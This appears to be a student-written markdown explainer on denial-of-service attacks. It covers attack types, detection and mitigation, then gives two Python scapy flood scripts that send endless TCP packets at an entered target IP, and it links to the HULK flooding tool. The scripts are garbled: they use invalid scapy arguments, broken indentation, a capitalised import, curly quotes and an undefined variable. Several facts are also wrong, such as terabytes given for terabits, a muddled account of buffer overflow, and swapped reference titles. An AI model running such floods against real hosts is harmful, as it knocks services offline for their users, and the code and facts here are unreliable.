# Denial-of-Service (DoS) attack

*Zhen Meng, Zhixin Han*

## Background of DoS

A Denial-of-Service (DoS) attack is a malicious, targeted attack that floods a network with false requests in order to disrupt business operations.

![alt text](what-is-ddos-botmaster.png)

## DoS Attack in Real Life

DoS attacks can cost an organization both time and money, because their resources and services are inaccessible during that time. 
Not only will you be put out of action for quite a while, but a successful DoS attack can also cause the systems to fail. 

Unlike cyberattacks that steals sensitive information or money, initial DDoS attacks are launched to make websites inaccessible to their users. DoS and DDoS attacks are also used to draw attention away so that hackers can launch secondary attacks elsewhere. [1]

A famous example of DDOS attack happened to AWS, it was hit by a large DDoS attack in February 2020. The attack lasted for three days and peaked at 2.3 terabytes per second. [Click here for more information](https://www.a10networks.com/blog/aws-hit-by-largest-reported-ddos-attack-of-2-3-tbps/)

## Types of DoS attack

Generally, DoS attack fall in two categories, some of them crash web-based services and others flood the service instead. Within those two categories, there are many different subgroups, they varies based on the methods of attackers, the equipment being targeted and so on. [2]

### Buffer Overflow attacks

This is the most common form of DoS attack. A buffer overflow type of attack can cause a machine to consume all available hard disk space, memory, or CPU time. The memory storage holds temporary data being transferred will alse be consumed.

![alt text](buffer-overflow.png)

### Flood attacks

By saturating a targeted server with an overwhelming amount of packets, a malicious actor is able to oversaturate server capacity, resulting in denial-of-service. 

- ICMP Floods

Also called smurf or ping attacks. It focus on exploiting misconfigured network devices. In these attacks, attackers send spoofed packets or the false IP addresses that pings every computer on the targeted network. The network will face a surge in traffic, the system becomes flooded with responses from the malicious packet.

- SYN Floods

This type of folld attack exploits the Transmission Control Protocol (TCP) handshake, which is used for the TCP network to create a connection with a local host/server. In a SYN flood, a connection request to a server, but the handshake will be left imcomplete. These requests keep the host in an occupied status. Legitimate users will be prevented from connecting to the network when all the ports are saturated. Below is an illustration of TCP handshake.[1]

![alt text](TCP-connection-1.png)


## DoS attack vs. DDoS attack

The primary distinction between them is where the attack originated. A DDoS attack is a coordinated attack launched from various locations by multiple systems at the same time, whereas a DoS attack is a single attack.DDoS attacks are the most powerful and difficult to detect internet attacks. The reason  is that they are introduced from multiple locations in order to hide their identities and prevent the victim from identifying the main source of the attack. As a result, distinguishing between genuine and fake network traffic is impossible.

![alt text](output-onlinepngtools.png)

## Identify DoS Attack


**Common indicators:**

- Slow network performance for common tasks 

All kinds of slow network performances for normal tasks like logging in to an account, downloading files,etc.

- Inability to access online resources

The inability to access online recources like health record and educational resources.

- An interruption or loss in connectivity

The interruption or loss in connectivity of multiple devices on the same network. [2]

## Methods to Reduce the Risk of a DoS attack

**Avoid beingpart of the attack:**

- Enroll in a DoS protection service

- Create a disaster recovery plan

**Strengthen your devices:**

- Install and maintain antivirus software

- Install a firewall

- Evaluate security settings and follow good security practices [3]

## DoS attack Implementation 

### Single IP single port

A large number of packets are sent to web server by using _single IP_ and from _single port number_. 

Using a for loop a large number of packets are sending to web server using single IP from single port number. Normally,it is a low level attack to test the web server’s behavior. [4]

```
from scapy.all import *
source_IP = input("Enter IP address of Source: ")
target_IP = input("Enter IP address of Target: ")
source_port = int(input("Enter Source Port Number:"))
i = 1

while True:
   IP1 = IP(source_IP = source_IP, destination = target_IP)
   TCP1 = TCP(srcport = source_port, dstport = 80)
   pkt = IP1 / TCP1
   send(pkt, inter = .001)
   
   print ("packet sent ", i)
      i = i + 1
```

### Multiple IP multiple port 

A large number of packets are sent to web server by using _multiple IPs_ and from _multiple ports_. 

Using while loop to creat multiple IP addresses and ports to send large numbers of packets simutaneously to attack victims’ Ip address.[4]


```
Import random
from scapy.all import *
target_IP = input("Enter IP address of Target: ")
i = 1

while True:
   a = str(random.randint(1,254))
   b = str(random.randint(1,254))
   c = str(random.randint(1,254))
   d = str(random.randint(1,254))
   dot = “.”
   Source_ip = a + dot + b + dot + c + dot + d
   
   for source_port in range(1, 65535)
      IP1 = IP(source_IP = source_IP, destination = target_IP)
      TCP1 = TCP(srcport = source_port, dstport = 80)
      pkt = IP1 / TCP1
      send(pkt,inter = .001)
      
      print ("packet sent ", i)
         i = i + 1
```

## DoS Tools and Performance


### HULK

This tool successfully avoids caching by attacking the server directly with unique packets. HULK makes each request unique, unlike many other tool that transmit packets in a predictable pattern, making the attack easier to detect and halt. This program also allows you to securely carry out the  attack while maintaining control to stop it at any point.Now we are attak an ip address, using wireshark to monitor the traffic, there are continuity of packets sending to the source IP. [5]

[Get Hulk through the Repo](https://github.com/grafov/hulk)

[Video DoS/DDoS attack tutorial](https://www.youtube.com/watch?v=fGWkhmCp_js&t=117s)

![This is an image](hulk-tool.png)

### Wireshark

![This is an image](wire-shark.jpg)


## References

[1]: WHAT ARE DENIAL-OF-SERVICE (DOS) ATTACKS? [Link](https://spanning.com/blog/denial-of-service-attacks-web-based-application-security-part-7/).

[2]: Denial-of-Service (DoS) Attacks — Web-based Application Security, Part 7 [Link](https://www.crowdstrike.com/cybersecurity-101/denial-of-service-dos-attacks/).

[3]: Understanding Denial-of-Service Attacks [Link](https://www.cisa.gov/uscert/ncas/tips/ST04-015).

[4]: DoS & DDoS attack [Link](https://www.tutorialspoint.com/python_penetration_testing/python_penetration_testing_dos_and_ddos_attack.htm).

[5]: Hulk DDoS Tool : Complete Installation & Usage with Examples [Link](https://allabouttesting.org/hulk-ddos-tool-complete-installation-usage-with-examples/).
